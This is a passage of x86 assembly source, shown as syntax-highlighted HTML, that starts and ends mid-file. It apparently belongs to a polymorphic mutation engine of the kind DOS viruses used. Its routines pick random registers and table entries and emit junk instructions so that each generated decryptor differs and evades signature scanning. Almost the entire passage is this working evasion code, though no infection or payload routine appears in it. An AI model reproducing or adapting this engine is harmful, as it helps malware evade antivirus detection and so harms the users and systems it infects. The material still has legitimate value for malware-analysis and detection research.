        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D2h</span><span class="sc0">    </span><span class="sc1">; rol [reg],cl</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">correct_regpair_in_al</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C7h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">mom_routines_inc_mem</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc0">    </span><span class="sc1">; inc [reg]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">correct_regpair_in_al</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C7h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">mom_routines_dec_mem</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc0">    </span><span class="sc1">; dec [reg]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">correct_regpair_in_al</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C7h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">mom_routines_neg_mem</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F6h</span><span class="sc0">    </span><span class="sc1">; neg [reg]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">correct_regpair_in_al</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C7h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">mom_routines_not_mem</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F6h</span><span class="sc0">    </span><span class="sc1">; not [reg]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">correct_regpair_in_al</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C7h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">poly_init_stage1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">register_compat</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">register_compat</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_limit</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">garbage_instr_number</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">

</span><span class="sc5">begin_initreg_stuff</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">restrict_grb_ax_is_used</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">using_8_bits_register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">select_garbage_register</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_reg_compatibility</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">no_garb_limitnd</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_instr_with_compat</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">call_generator</span><span class="sc0">

</span><span class="sc5">init_ended_chk</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_init</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">register_compat</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0EFh</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">begin_initreg_stuff</span><span class="sc0">     </span><span class="sc1">; all initialized?</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">all_regs_initial_pnt</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">all_regs_initial_pnt</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; store end of this</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">; part</span><span class="sc0">
</span><span class="sc5">no_garb_limitnd</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_garbage_ended</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">init_ended_chk</span><span class="sc0">

</span><span class="sc5">check_garbage_ended</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">garbage_instr_number</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">; finished</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">garbage_instr_fnshed</span><span class="sc0">            </span><span class="sc1">; garb instr?</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">garbage_instr_number</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">do_one_garbage_instr</span><span class="sc0">

</span><span class="sc5">garbage_instr_fnshed</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_0_or_1</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">do_one_garbage_instr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_limit</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; initialize the register</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">; to a known value</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">service_routines_table</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">garbage_register</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">garbage_word_byte</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">register_compat</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">    </span><span class="sc1">; mark as initialized</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">exit_this_stage</span><span class="sc0">

</span><span class="sc5">do_one_garbage_instr</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_instr_from_table</span><span class="sc0">   </span><span class="sc1">; select instruction from table</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">call_generator</span><span class="sc0">         </span><span class="sc1">; generate code using table info</span><span class="sc0">
                           </span><span class="sc1">; with appropriate handler</span><span class="sc0">
</span><span class="sc5">exit_this_stage</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">check_init</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11h</span><span class="sc0">

</span><span class="sc5">check_init_loop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">register_compat</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">check_init_fc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">             </span><span class="sc1">; low nibble</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">register_compat</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">not_used_in_this</span><span class="sc0">
</span><span class="sc5">check_init_fc</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">register_compat</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">    </span><span class="sc1">; used in this exec?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">not_used_in_this</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">register_compat</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">    </span><span class="sc1">; signal usage</span><span class="sc0">
</span><span class="sc5">not_used_in_this</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; check next bit (register)</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">check_init_loop</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; selects garbage register and the dimension (w/b) and stores it in memory</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">select_garbage_register</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_0_or_1</span><span class="sc0">   </span><span class="sc1">; word or byte</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">garbage_word_byte</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc5">redo_sel_gs</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">           </span><span class="sc1">; get a register for garbage</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_limit</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">garbage_word_byte</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">no_sp_check_needed_gs</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">           </span><span class="sc1">; do not use SP</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">redo_sel_gs</span><span class="sc0">     </span><span class="sc1">; redo selection</span><span class="sc0">

</span><span class="sc5">no_sp_check_needed_gs</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">garbage_register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">   </span><span class="sc1">; save reg</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; gets:  si pointer to entry table</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">call_generator</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; gets byte from table</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">     </span><span class="sc1">; last nibble contains both lenght</span><span class="sc0">
                    </span><span class="sc1">; and type of instruction</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">      </span><span class="sc1">; calculate pointer to handler</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">      </span><span class="sc1">; to beginning of entry</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">routines_table</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">


</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; gets:     si pointer to table entry</span><span class="sc0">
</span><span class="sc1">; returns:  ax lenght of the table entry</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">move_through_table</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; get the first byte of the entry</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">     </span><span class="sc1">; lower nibble needed for lenght</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">entry_long_two_bytes</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">entry_long_two_bytes</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">entry_long_two_bytes</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">entry_lenght_coded_in_hn</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; else long 1 byte</span><span class="sc0">

</span><span class="sc5">return_move_through_table</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">      </span><span class="sc1">; restore si (for previous lodsb)</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">entry_long_two_bytes</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">return_move_through_table</span><span class="sc0">


</span><span class="sc5">entry_lenght_coded_in_hn</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">               </span><span class="sc1">; reget full byte</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">; shift the lower nibble</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">; out and keep the higher</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">; that holds instruction</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">; length</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">return_move_through_table</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; returns: si pointer to selected entry in the table</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">get_instr_from_table</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">i_table_start</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">60h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_limit</span><span class="sc0">    </span><span class="sc1">; select entry from table</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">jcxz</span><span class="sc0">    </span><span class="sc5">no_end_table_ff</span><span class="sc0">

</span><span class="sc5">table_skipping_loop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">end_table_ff_check</span><span class="sc0">  </span><span class="sc1">; check for end</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">move_through_table</span><span class="sc0">  </span><span class="sc1">; get lenght entry</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; and skip the entry</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">table_skipping_loop</span><span class="sc0"> </span><span class="sc1">; loop to desired entry</span><span class="sc0">


</span><span class="sc5">end_table_ff_check</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0"> </span><span class="sc1">; reached end of table</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">no_end_table_ff</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">i_table_start</span><span class="sc0">    </span><span class="sc1">; if so restart</span><span class="sc0">
</span><span class="sc5">no_end_table_ff</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; gets:    dx value of compatible entries to check with the hn</span><span class="sc0">
</span><span class="sc1">; returns: si pointer to selected entry in table</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">get_instr_with_compat</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; dx holds compatible type</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">i_table_start</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5Fh</span><span class="sc0">     </span><span class="sc1">; select random instruction from tbl</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_limit</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

</span><span class="sc5">loop_search_compat</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">end_table_ff_check</span><span class="sc0">

        </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; get info byte from table entry</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
